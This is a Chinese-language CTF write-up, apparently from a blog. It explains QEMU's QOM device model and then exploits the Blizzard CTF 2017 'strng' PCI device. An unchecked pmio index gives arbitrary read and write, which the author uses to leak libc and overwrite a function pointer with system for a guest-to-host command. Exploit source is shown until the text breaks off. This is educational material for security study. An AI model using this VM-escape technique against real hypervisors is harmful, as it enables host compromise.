<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">        PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;<span class="built_in">exit</span> = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">"PCI Test Device"</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后是<code>Object</code>对象</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="keyword">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>之前提到的<code>Type</code>以及<code>ObjectClass</code>只是一个类型，而不是具体的设备。<code>TypeInfo</code>结构体中有两个函数指针：<code>instance_init</code>以及<code>class_init</code>。<code>class_init</code>负责初始化<code>ObjectClass</code>结构体，<code>instance_init</code>负责初始化具体<code>Object</code>结构体。</p>
<blockquote>
<p>the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device’s -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine).<br>Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。<br><code>Object</code>示例如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Object</span> <span class="title">Object</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass *<span class="class"><span class="keyword">class</span>;</span> <span class="comment">/* points to the Type's ObjectClass instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/qemu/typedefs.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> <span class="title">DeviceState</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> <span class="title">PCIDevice</span>;</span></span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Object parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> &#123;</span></span><br><span class="line">        DeviceState qdev;</span><br><span class="line">        ...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">YourDeviceState</span>&#123;</span></span><br><span class="line">        PCIDevice pdev;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>（QOM will use instace_size as the size to allocate a Device Object, and then it invokes the instance_init ）</p>
</blockquote>
<p>QOM会为设备<code>Object</code>分配<code>instance_size</code>大小的空间，然后调用<code>instance_init</code>函数（在<code>ObjectClass</code>的<code>class_init</code>函数中定义）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>最后是PCI的内存空间，qemu使用MemoryRegion表示内存空间，使用<code>MemoryRegionOps</code>结构体来对内存的操作进行表示，如<code>PMIO</code>或<code>MMIO</code>。对每个<code>PMIO</code>或者<code>MMIO</code>操作都需要相应的<code>MemoryRegionOps</code>结构体，其中包含相应的<code>read/write</code>回调函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_mmio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_mmio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_pio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_pio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>首先用<code>memory_region_init_io</code>函数初始化内存空间(MemoryRegion结构体)，记录空间大小，注册相应的读写函数等；然后调用<code>pci_register_bar</code>来注册BAR等信息。需要指出的无论是MMIO还是PMIO，其对应的空间都需要显式的指出（即静态生命或动态分配），因为memory_region_init_io只是记录空间大小而并不分配。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* hw/misc/pci-testdev.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_IOSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_MEMSIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCITestDevState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        PCIDevice parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">        MemoryRegion mmio;</span><br><span class="line">        MemoryRegion portio;</span><br><span class="line">        IOTest *tests;</span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">&#125; PCITestDevState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br><span class="line">        memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;pci_testdev_mmio_ops, d,</span><br><span class="line">                                                    <span class="string">"pci-testdev-mmio"</span>, IOTEST_MEMSIZE * <span class="number">2</span>); </span><br><span class="line">        memory_region_init_io(&amp;d-&gt;portio, OBJECT(d), &amp;pci_testdev_pio_ops, d,</span><br><span class="line">                                                    <span class="string">"pci-testdev-portio"</span>, IOTEST_IOSIZE * <span class="number">2</span>); </span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);</span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;portio);</span><br></pre></td></tr></table></figure>
<h2 id="Blizzard-CTF-2017-Strng"><a href="#Blizzard-CTF-2017-Strng" class="headerlink" title="Blizzard CTF 2017 Strng"></a>Blizzard CTF 2017 Strng</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>最开始用type_init调用pci_strng_register_types初始化一个type_info，在结构体中要给出strng_init和class_init方法，之后调用type_register_static添加type</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">type_init(pci_strng_register_types)</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_strng_register_types</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> TypeInfo strng_info = &#123;</span><br><span class="line">        .name          = <span class="string">"strng"</span>,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(STRNGState),</span><br><span class="line">        .instance_init = strng_instance_init,</span><br><span class="line">        .class_init    = strng_class_init,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    type_register_static(&amp;strng_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>strng_class_init初始化一个ObjectClass，赋值<code>pci_strng_realize</code>;赋给设备一个vendor_id、device_id、class_id等唯一标识。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">strng_class_init</span><span class="params">(ObjectClass *class, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_strng_realize;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e9</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>strng_instance_init初始化一个Object实例，给函数指针赋值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">strng_instance_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STRNGState *strng = STRNG(obj);</span><br><span class="line"></span><br><span class="line">    strng-&gt;srand = srand;</span><br><span class="line">    strng-&gt;rand = rand;</span><br><span class="line">    strng-&gt;rand_r = rand_r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pci_strng_realize首先用<code>memory_region_init_io</code>函数初始化内存空间(MemoryRegion结构体)，记录空间大小，注册相应的读写函数等；然后调用<code>pci_register_bar</code>来注册BAR等信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;mmio, OBJECT(strng), &amp;strng_mmio_ops, strng, <span class="string">"strng-mmio"</span>, STRNG_MMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;strng-&gt;mmio);</span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;pmio, OBJECT(strng), &amp;strng_pmio_ops, strng, <span class="string">"strng-pmio"</span>, STRNG_PMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;strng-&gt;pmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>strng_mmio_ops</code>和<code>strng_pmio_ops</code>给了读写mmio和pmio的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps strng_mmio_ops = &#123;</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps strng_pmio_ops = &#123;</span><br><span class="line">    .read = strng_pmio_read,</span><br><span class="line">    .write = strng_pmio_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最后看下设备的结构体，后面跟了三个函数指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="keyword">uint32_t</span> addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="keyword">void</span> (*srand)(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed);</span><br><span class="line">    <span class="keyword">int</span> (*rand)(<span class="keyword">void</span>);</span><br><span class="line">    <span class="keyword">int</span> (*rand_r)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure>
<p>先来看下mmio的读写操作(反编译之后记得将opaque结构体转成STRNGState *类型方便查看).</p>
<p>mmio_read:如果<code>addr</code>是<code>4</code>的倍数，就返回<code>regs[addr&gt;&gt;2]</code>，其他情况返回-1。</p>
<p>mmio_write:如果<code>addr</code>是<code>4</code>的倍数，取<code>i</code>为<code>addr&gt;&gt;2</code>。</p>
<ol>
<li>如果<code>i</code>为<code>1</code>,调用里面的<code>rand</code>函数，参数为<code>(opaque,i,val)</code>，结果存储在<code>regs[1]</code>里。</li>
<li>如果<code>i</code>为<code>0</code>,调用里面的<code>srand</code>函数，参数为<code>val</code></li>
<li>如果<code>i</code>为<code>3</code>,调用里面的<code>rand_r</code>函数，参数为<code>&amp;regs[2]</code>，<code>regs[3]</code>存储函数返回值，<code>regs[i]</code>存储<code>val</code></li>
<li>其他情况直接把<code>val</code>赋值给<code>regs[i]</code></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">    result = opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  hwaddr v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v6; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = ((__int64 (__fastcall *)(STRNGState *, hwaddr, <span class="keyword">uint64_t</span>))opaque-&gt;rand)(opaque, v4, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4 &lt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_QWORD))opaque-&gt;srand)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = val;</span><br><span class="line">        v6 = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *))opaque-&gt;rand_r)(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">        LODWORD(val) = v5;</span><br><span class="line">        opaque-&gt;regs[<span class="number">3</span>] = v6;</span><br><span class="line">      &#125;</span><br><span class="line">      opaque-&gt;regs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再来看下pmio相关的读写操作。</p>
<p>pmio_read:如果addr是<code>4</code>的倍数，<code>idx取opaque的成员addr</code>，如果<code>idx</code>是<code>4</code>的倍数，直接返回<code>regs[idx&gt;&gt;2]</code>，否则返回<code>opaque-&gt;addr</code></p>
<p>pmio_write:</p>
<ol>
<li>如果addr为<code>0</code>，直接将<code>opaque-&gt;addr</code>赋值为<code>val</code></li>
<li>如果addr为<code>4</code>的倍数，<code>idx取opaque的成员addr</code>。<code>v5</code>取<code>idx&gt;&gt;2</code>，如果<code>v5</code>为<code>1</code>，调用<code>rand(opaque,4,val)</code>，结果存放在<code>regs[1]</code>;如果<code>v5</code>为<code>0</code>，调用<code>srand(val)</code>;如果<code>v5</code>为<code>3</code>，调用<code>rand_r(&amp;reg[2],4,val)</code>;否则将<code>val</code>赋值给<code>regs[v5]</code></li>
</ol>
<p>通过函数分析可以看到这里对于idx没有检查，我们可以用<code>pmio_write(0,offset)</code>设置<code>opaque-&gt;addr</code>为<code>offset</code>，之后用<code>pmio_read(offset)</code>读取<code>offset&gt;&gt;2</code>的值实现任意读;或者先用<code>pmio_write(0,offset)</code>设置<code>opaque-&gt;addr</code>为<code>offset</code>，再调用<code>pmio_write(4,val)</code>实现<code>regs[offset&gt;&gt;2] = val</code>的任意写。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> idx; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        idx = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(idx &amp; <span class="number">3</span>) )</span><br><span class="line">          result = opaque-&gt;regs[idx &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = opaque-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> idx; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        idx = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(idx &amp; <span class="number">3</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = idx &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">1</span>] = ((__int64 (__fastcall *)(STRNGState *, <span class="keyword">signed</span> __int64, <span class="keyword">uint64_t</span>))opaque-&gt;rand)(</span><br><span class="line">                                opaque,</span><br><span class="line">                                <span class="number">4L</span>L,</span><br><span class="line">                                val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 &lt; <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ((<span class="keyword">void</span> (__fastcall *)(_QWORD))opaque-&gt;srand)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">3</span>] = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, <span class="keyword">signed</span> __int64, <span class="keyword">uint64_t</span>))opaque-&gt;rand_r)(</span><br><span class="line">                                &amp;opaque-&gt;regs[<span class="number">2</span>],</span><br><span class="line">                                <span class="number">4L</span>L,</span><br><span class="line">                                val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[v5] = val;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据上面实现的任意地址读写，我们可以用任意读泄露结构体后面的函数指针，因为这是在<code>qemu的进程空间</code>，所以可以把它想象成VMware虚拟机里的一道普通glibc pwn，泄露的地址就是这个Bin(qemu)的函数libc地址，进而算出<code>libc_base</code>。</p>
<p>getshell我们可以先往<code>regs[2]</code>写入<code>command</code>，之后覆写rand_r为system，调用mmio_write里分支为<code>3</code>的地方即可</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>启动脚本的命令如下，做了端口映射，方便scp传输，传输文件可以用<code>scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">        -m 1G \</span><br><span class="line">        -device strng \</span><br><span class="line">        -hda my-disk.img \</span><br><span class="line">        -hdb my-seed.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -L pc-bios/ \</span><br><span class="line">        -<span class="built_in">enable</span>-kvm \</span><br><span class="line">        -device e1000,netdev=net0 \</span><br><span class="line">        -netdev user,id=net0,hostfwd=tcp::5555-:22 \</span><br></pre></td></tr></table></figure></p>
<p>调试卡了一会，环境为<code>ubuntu 16.04</code>，<code>gdb</code>版本<code>7.1</code>出错，编译了<code>gdb8</code>，在VMware查看进程号<code>ps -aux | grep qemu</code>，attach上去<code>sudo /usr/local/gdb/bin/gdb attach -q [pid]</code>即可，断点下在各个读写函数上<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">b *strng_pmio_write</span><br><span class="line">b *strng_pmio_read</span><br><span class="line">b *strng_mmio_write</span><br><span class="line">b *strng_pmio_read</span><br></pre></td></tr></table></figure></p>
<p>使用<code>print *(STRNGState*)($rdi)</code>输出结构体(是利用完之后停的所有后面是system)</p>
<p><img src="/2020/09/03/strng/3.png" alt="strng"></p>
<p>结构体存放在堆上，后面还有堆地址，可以泄露libc和heap地址。</p>
<p><img src="/2020/09/03/strng/4.png" alt="heap"></p>
<p>这里有个神奇的地方，就是这个数组的空间是<code>65*4</code>而不是<code>64*4</code>，这个可以通过<code>srandom</code>地址减去<code>64*5</code>看到。因为<code>read/write</code>操作的都是<code>4字节</code>，所以我们泄露一个64位地址要用两次，最后部分写<code>rand_r</code>为<code>system</code>，在<code>regs[2]</code>布置好参数，调用mmio_write的<code>3</code>分支即可。(我的参数为<code>cat /home/wz/flag</code>)</p>
<p>编译命令：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc ./exp.c -m32 -static -o exp</span><br></pre></td></tr></table></figure></p>
<h3 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h3><p>偏移为<code>ubuntu 16.04</code>的<code>libc-2.23</code>中得到的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem+addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem+addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)(inl(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_abread</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span 